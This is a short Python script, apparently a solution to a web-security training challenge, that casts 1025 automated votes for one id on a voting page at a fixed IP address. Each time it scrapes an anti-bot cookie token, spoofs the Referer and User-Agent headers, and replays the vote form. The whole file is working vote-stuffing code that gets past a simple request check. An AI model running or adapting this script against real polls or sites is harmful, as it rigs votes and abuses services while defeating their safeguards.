#!/usr/bin/python3

import requests

"""Sent post with header"""

host = "http://158.69.76.135/level2.php"

for a in range(1025):
    response = requests.get('http://158.69.76.135/level2.php')
    header = {
      "Referer": "http://158.69.76.135/level2.php",
      "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0WOW64 rv: 44.0) Gecko/20100101 Firefox/44",
    }
    payload = {'key': response.cookies['HoldTheDoor'],
               'id': '1557', 'holdthedoor': 'submit'
               }
    cookies = {'HoldTheDoor': response.cookies['HoldTheDoor']}
    req = requests.post(host, payload, headers=header, cookies=cookies)
    print("vote: {} status: {}".format(a, response.status_code))
